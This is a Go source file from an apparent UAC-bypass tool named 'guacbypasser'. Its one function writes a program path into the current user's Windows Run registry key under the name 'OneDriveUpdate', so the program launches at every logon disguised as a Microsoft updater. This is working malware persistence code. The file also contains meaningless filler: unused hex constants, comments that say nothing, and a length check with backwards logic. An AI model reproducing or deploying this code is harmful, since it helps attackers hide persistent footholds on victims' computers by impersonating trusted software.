package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_HKCU_Runer(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_HKCU_Runer__{
		Type:   "_hckuruner",
		Method: "registry-command",
		Scode: [4]uintptr{
			0x05234ef, 0x122ce,
			0x974ef, 0x2cce,
		},

		Location:      fmt.Sprintf("%s\\_hckuruner.gUAC", os.Getenv("APPDATA")),
		_K_HKCU_Runer: 0x2,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		log.Fatal(err)
	}

	// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("OneDriveUpdate", currentDir); err != nil {
		log.Fatal(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Fatal(err)
	}

	return err
}
